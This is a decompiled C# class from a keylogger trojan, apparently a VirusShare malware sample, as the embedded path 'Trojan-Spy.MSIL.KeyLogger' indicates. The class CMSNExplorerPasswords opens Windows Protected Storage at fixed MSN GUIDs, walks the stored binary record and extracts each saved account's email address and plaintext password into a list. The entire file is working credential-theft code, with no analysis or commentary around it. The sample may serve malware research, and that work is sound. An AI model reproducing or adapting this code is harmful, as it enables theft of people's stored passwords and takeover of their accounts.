// Decompiled with JetBrains decompiler
// Type: Roy.CMSNExplorerPasswords
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Roy.PStoreLib;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Roy
{
  internal class CMSNExplorerPasswords : CUtils, IEnumerable<CMSNExplorerPassword>
  {
    private readonly Guid guidMSN;
    private readonly Guid guidSubMSN;
    private CProtectStore m_PStore;
    private PST_KEY m_KeyType;
    private List<CMSNExplorerPassword> m_MSNPass;

    public CMSNExplorerPasswords()
    {
      this.guidMSN = new Guid("{B9819C52-1E12-4BBD-91E7-AF9AFEA5B02D}");
      this.guidSubMSN = new Guid("{87F5AAB7-CA62-41C5-8896-27714D7B7E73}");
      this.m_PStore = new CProtectStore();
      this.m_MSNPass = new List<CMSNExplorerPassword>();
    }

    public void Refresh()
    {
      CItem citem = this.m_PStore.get_Items(this.guidMSN, this.guidSubMSN).get_Item(0);
      this.m_MSNPass.Clear();
      if (citem == null)
        return;
      GCHandle gcHandle = GCHandle.Alloc((object) citem.ReadBinary(), GCHandleType.Pinned);
      CMSNExplorerPasswords.MSNPasswordHeader msnPasswordHeader1;
      object structure = Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), msnPasswordHeader1.GetType());
      CMSNExplorerPasswords.MSNPasswordHeader msnPasswordHeader2;
      CMSNExplorerPasswords.MSNPasswordHeader Expression = structure != null ? (CMSNExplorerPasswords.MSNPasswordHeader) structure : msnPasswordHeader2;
      if (Expression.cAccounts == 0)
        return;
      IntPtr ptr = new IntPtr(checked (gcHandle.AddrOfPinnedObject().ToInt32() + Strings.Len((object) Expression)));
      short num1 = checked ((short) (Expression.cAccounts - 1));
      short num2 = 0;
      while ((int) num2 <= (int) num1)
      {
        int num3 = Marshal.ReadInt32(ptr);
        ptr = new IntPtr(checked (ptr.ToInt32() + 4));
        string szEmail = this.CopyString(ptr);
        ptr = new IntPtr(checked (ptr.ToInt32() + num3));
        int num4 = Marshal.ReadInt32(ptr);
        ptr = new IntPtr(checked (ptr.ToInt32() + 4));
        string szPassword = this.CopyString(ptr);
        this.m_MSNPass.Add(new CMSNExplorerPassword(szEmail, szPassword));
        ptr = new IntPtr(checked (ptr.ToInt32() + num4 + 24));
        checked { ++num2; }
      }
      gcHandle.Free();
    }

    public PST_KEY KeyType
    {
      get => this.m_KeyType;
      set
      {
        this.m_KeyType = value;
        this.m_PStore.KeyType = value;
      }
    }

    public IEnumerator<CMSNExplorerPassword> GetEnumerator()
    {
      this.Refresh();
      return (IEnumerator<CMSNExplorerPassword>) this.m_MSNPass.GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator1()
    {
      this.Refresh();
      return (IEnumerator) this.m_MSNPass.GetEnumerator();
    }

    private struct MSNPasswordHeader
    {
      public int dwUnkType;
      public int cAccounts;
    }

    private struct MSNPass
    {
      public string strEmail;
      public string strPass;
    }
  }
}
